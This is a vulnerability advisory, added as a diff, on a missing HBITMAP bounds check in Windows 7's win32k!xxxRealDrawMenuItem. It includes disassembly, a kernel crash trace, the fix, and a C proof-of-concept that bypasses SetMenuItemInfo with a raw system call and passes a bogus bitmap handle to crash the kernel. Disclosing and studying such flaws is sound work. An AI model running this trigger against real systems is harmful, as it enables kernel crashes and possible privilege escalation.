@@ -1,0 +1,251 @@
+Microsoft Windows win32k!xxxRealDrawMenuItem() missing HBITMAP bounds checks
+----------------------------------------------------------------------------
+
+Microsoft produce two builds of each of thier supported operating system, a
+checked build and a free build. The free build is intended for end users, and
+the checked build is intended for low-level developers (note: you would know if
+you were using the checked build). The primary difference between the checked
+and free builds are compiler settings more conducive to debugging and
+additional runtime checks intended to identify programming errors in drivers as
+early as possible.
+
+Many of the runtime checks absent from the free build take the form of
+assertions, similar to the standard assert() macro (c programmers will
+recognise this as similar to defining NDEBUG). Most security researchers
+know it's common to find locations in large codebases where developers use an
+assertion to handle error conditions, forgetting that these checks are compiled
+out of production code.
+
+On a hunch, I browsed the assertion strings in the checked build looking for
+anything that could be a bounds check, and found a candidate in win32k.sys
+from Windows 7.
+
+.text:BF8B83D7 loc_BF8B83D7:               ; CODE XREF: xxxRealDrawMenuItem(x,x,x,x,x,x)+13Dj
+.text:BF8B83D7     push    offset asc_BFA98BB0 ; "Assertion failed: (pItem->hbmp >= HBMME"...
+.text:BF8B83DC     push    offset aXxxrealdrawmen ; "xxxRealDrawMenuItem"
+.text:BF8B83E1     push    601h            ; int
+.text:BF8B83E6     push    offset asc_BFA988EC ; "d:\\w7rtm\\windows\\core\\ntuser\\kernel\\mnd"...
+.text:BF8B83EB     push    1000000h        ; int
+.text:BF8B83F0     push    ebx             ; int
+.text:BF8B83F1     call    _VRipOutput
+.text:BF8B83F6     add     esp, 18h
+.text:BF8B83F9     test    eax, eax
+.text:BF8B83FB     jz      short loc_BF8B83FE
+.text:BF8B83FD     int     3               ; Trap to Debugger
+
+And additionally,
+
+.text:BF8B83FE loc_BF8B83FE:               ; CODE XREF: xxxRealDrawMenuItem(x,x,x,x,x,x)+142j
+.text:BF8B83FE                             ; xxxRealDrawMenuItem(x,x,x,x,x,x)+168j
+.text:BF8B83FE     mov     edi, [esi+40h]   
+.text:BF8B8401     add     edi, 4Fh
+.text:BF8B8404     cmp     edi, 5Dh
+.text:BF8B8407     jb      short loc_BF8B8430
+.text:BF8B8409     push    offset asc_BFA98B74 ; "Assertion failed: wBmp < OBI_COUNT"
+.text:BF8B840E     push    offset aXxxrealdrawmen ; "xxxRealDrawMenuItem"
+.text:BF8B8413     push    604h            ; int
+.text:BF8B8418     push    offset asc_BFA988EC ; "d:\\w7rtm\\windows\\core\\ntuser\\kernel\\mnd"...
+.text:BF8B841D     push    1000000h        ; int
+.text:BF8B8422     push    ebx             ; int
+.text:BF8B8423     call    _VRipOutput
+.text:BF8B8428     add     esp, 18h
+.text:BF8B842B     test    eax, eax
+.text:BF8B842D     jz      short loc_BF8B8430
+.text:BF8B842F     int     3               ; Trap to Debugger
+
+With these tests compiled out, you can pass a pathological HBITMAP and it gets
+trusted without validation. The HBITMAP here is used as an index into
+gpsi->oembmi[] (of type tagSERVERINFO in the public symbols, I assume gpsi is
+global pointer to server info).
+
+Reaching this code was non-trivial, but I found a way to trigger it reliably.
+
+kd> .lastevent
+Last event: Access violation - code c0000005 (!!! second chance !!!)
+  debugger time: Mon Mar  8 23:10:15.892 2010 (GMT+1)
+kd> kv
+ChildEBP RetAddr  Args to Child
+981915f4 92b8d4d4 f10105c8 00000002 0000008c win32k!xxxRealDrawMenuItem+0x130 (FPO: [6,47,4])
+981916a4 92adb609 f10105c8 0110007c 981916ec win32k!xxxDrawState+0x1cd (FPO: [8,33,4])
+98191710 92adbdaf f10105c8 fe607468 00000000 win32k!xxxDrawMenuItem+0x3b4 (FPO: [5,14,4])
+9819177c 92bfb448 f10105c8 00000001 fe607920 win32k!xxxMenuDraw+0x1f9 (FPO: [3,17,4])
+981917d4 92b059b8 00000016 f10105c8 00000003 win32k!xxxMenuBarDraw+0x1b9 (FPO: [4,14,4])
+981917fc 92b3b694 0000100c 00000001 00000000 win32k!xxxDWP_DoNCActivate+0xc7 (FPO: [3,1,4])
+98191878 92b02b92 fe607920 00000086 00000001 win32k!xxxRealDefWindowProc+0x7fa (FPO: [SEH])
+9819189c 92b54859 fe607920 00000086 00000001 win32k!xxxDefWindowProc+0x10f (FPO: [4,0,4])
+981918dc 92b546a4 fe607920 00000086 00000001 win32k!xxxSendMessageTimeout+0x1ac (FPO: [8,7,4])
+98191904 92b1728b fe607920 00000086 00000001 win32k!xxxSendMessage+0x28 (FPO: [4,0,0])
+9819197c 92b095c1 00000000 00000c88 00000001 win32k!xxxActivateThisWindow+0x473 (FPO: [3,21,0])
+981919e4 92b091aa fe607920 fe5ad928 00000000 win32k!xxxSetForegroundWindow2+0x3d7 (FPO: [3,18,4])
+98191a24 92b17770 fe607920 00000001 fe5ad928 win32k!xxxSetForegroundWindow+0x1e4 (FPO: [2,8,4])
+98191a50 92b17537 00000000 00000001 fe600618 win32k!xxxActivateWindow+0x1b3 (FPO: [2,4,4])
+98191a64 92afd9dd fe607920 00000000 fe607920 win32k!xxxSwpActivate+0x44 (FPO: [1,0,0])
+98191abc 92b02c98 00000000 fe607920 00000000 win32k!xxxEndDeferWindowPosEx+0x278 (FPO: [2,16,4])
+98191adc 92b2c50e fe607920 00000000 00000000 win32k!xxxSetWindowPos+0xf6 (FPO: [7,1,4])
+98191b18 92b23b0d 00000000 00000005 0ad06a7a win32k!xxxShowWindow+0x25a (FPO: [2,3,4])
+98191c30 92b210b6 00080000 ff9d1d28 fe607250 win32k!xxxCreateWindowEx+0x12ed (FPO: [SEH])
+98191cf0 8285342a 80080000 98191cc0 98191cb4 win32k!NtUserCreateWindowEx+0x2a8 (FPO: [SEH])
+kd> vertarget
+Windows 7 Kernel Version 7600 MP (1 procs) Free x86 compatible
+Product: WinNt, suite: TerminalServer SingleUserTS
+Built by: 7600.16385.x86fre.win7_rtm.090713-1255
+Machine Name:
+Kernel base = 0x82810000 PsLoadedModuleList = 0x82958810
+Debug session time: Mon Mar  8 23:10:12.438 2010 (GMT+1)
+System Uptime: 0 days 0:04:07.341
+
+Interestingly, the win32 api required to reach the code (SetMenuItemInfo)
+interferes and rejects my call, so I must make the system call directly. This
+is complicated, as Microsoft provide no stub export in ntdll, so I have to
+invoke it manually. Maybe there's a cleaner way.
+
+Because of the additional information compiled into the assertion, I have lots
+of data about the failing code, including the variable names and filename.
+Therefore, I know the correct fix is to verify (pItem->hbmp >=
+HBMMENU_POPUPFIRST) && (pItem->hbmp <= HBMMENU_POPUPLAST) before line 1537 of
+\w7rtm\windows\core\ntuser\kernel\mndraw.c :-)
+
+I suspect there may be more assertions that should be checked, but haven't
+looked at them all.
+
+--------------------
+Affected Software
+------------------------
+
+At least Microsoft Windows 7 is affected.
+
+--------------------
+Consequences
+-----------------------
+
+An unprivileged user may be able to execute arbitrary kernel code, perhaps
+escaping protected mode, or becoming an Administrator, for example.
+
+Example code to trigger this vulnerability is available below.
+
+#ifndef WIN32_NO_STATUS
+# define WIN32_NO_STATUS    // I prefer working with ntstatus.h
+#endif
+#include <windows.h>
+#include <assert.h>
+#include <stdio.h>
+#include <winerror.h>
+#include <winternl.h>
+#include <stddef.h>
+#include <winnt.h>
+#include <uxtheme.h>
+#ifdef WIN32_NO_STATUS
+# undef WIN32_NO_STATUS
+#endif
+#include <ntstatus.h>
+
+#pragma comment(lib, "GDI32")
+#pragma comment(lib, "USER32")
+#pragma comment(lib, "UXTHEME")
+
+#ifndef MFS_CACHEDBMP
+# define MFS_CACHEDBMP 0x20000000L
+#endif
+
+// Linux style :-)
+//
+// kd> dds win32k!W32pServiceTable + ((0x1256 - 0x1000) * 4) L1
+// 92c95958  92b2d294 win32k!NtUserThunkedMenuItemInfo
+//
+#define __NR_NtUserThunkedMenuItemInfo 0x1256
+
+// Quick utility routine to execute a systemcall with the specified argument list.
+NTSTATUS SystemCall(DWORD Number, PVOID Args, ...)
+{
+    NTSTATUS Status;
+
+    __try {
+        __asm {
+            mov     eax, Number
+            lea     edx, Args
+            int     0x2e
+            mov     Status, eax
+        }
+    } __except(EXCEPTION_EXECUTE_HANDLER) {
+        return GetExceptionCode();
+    }
+    return Status;
+}
+    
+// kd> lm mwin32k
+// start    end        module
+// 92a90000 92cda000   win32k
+// kd> dt tagSERVERINFO oembmi
+// win32k!tagSERVERINFO
+// +0x970 oembmi : [93] tagOEMBITMAPINFO
+// kd> dt tagOEMBITMAPINFO
+// win32k!tagOEMBITMAPINFO
+//   +0x000 x                : Int4B
+//   +0x004 y                : Int4B
+//   +0x008 cx               : Int4B
+//   +0x00c cy               : Int4B
+
+int main(int argc, char **argv)
+{
+    MENUITEMINFO MenuItemInfo = { sizeof MenuItemInfo };
+    WNDCLASS Class = {0};
+    HMENU Menu;
+    BITMAPINFO Bitmap;
+
+    Menu                        = CreateMenu();
+    Class.lpfnWndProc           = DefWindowProc;
+    Class.lpszClassName         = "Class";
+    MenuItemInfo.fMask          = MIIM_BITMAP | MIIM_STATE;
+    MenuItemInfo.fState         = MFS_CACHEDBMP;
+    MenuItemInfo.hbmpItem       = (HBITMAP) 0x12345678;
+
+    // Register Window Class
+    RegisterClass(&Class);
+
+    // Possibly disable themes for current session
+    if (IsThemeActive()) {
+        EnableTheming(FALSE);
+    }
+
+    // This should work, but some ring3 code interferes.
+    // SetMenuItemInfo(Menu, 1, TRUE, &MenuItemInfo);
+
+    // Call NtUserThunkedMenuItemInfo() directly instead.
+    SystemCall(__NR_NtUserThunkedMenuItemInfo, Menu, 1, TRUE, TRUE, &MenuItemInfo, NULL);
+
+    // Trigger the bug
+    CreateWindowEx(WS_EX_LAYERED, "Class", "Window", WS_VISIBLE, 0, 0, 32, 32, NULL, Menu, NULL, NULL);
+
+    return 0;
+}
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+-------------------
+Greetz
+-----------------------
+
+$1$90AiGoxp$wyzZGQ6owkRG6OxPErj6M/
+$1$7.qXQkxE$5Zc1zQndJpGdoe1RF4Br1.
+$1$IPYBMipO$/HhHCPgulV/E0pgSvU1710
+$1$ULymMO9x$NVMLjZe8i25ajEfnsRowA.
+$1$8a/c6DLm$JDAFGdhEzIj2DR7RYC2gi.
+
+And all the other elite people I've worked with (sorry, too many to generate!).
+
+-------------------
+Notes
+-----------------------
+
+Approximate time to fix was 150 days.
+
+-------------------
+References
+-----------------------
+
+- http://msdn.microsoft.com/en-us/library/ms648001%28VS.85%29.aspx
+  SetMenuItemInfo Function
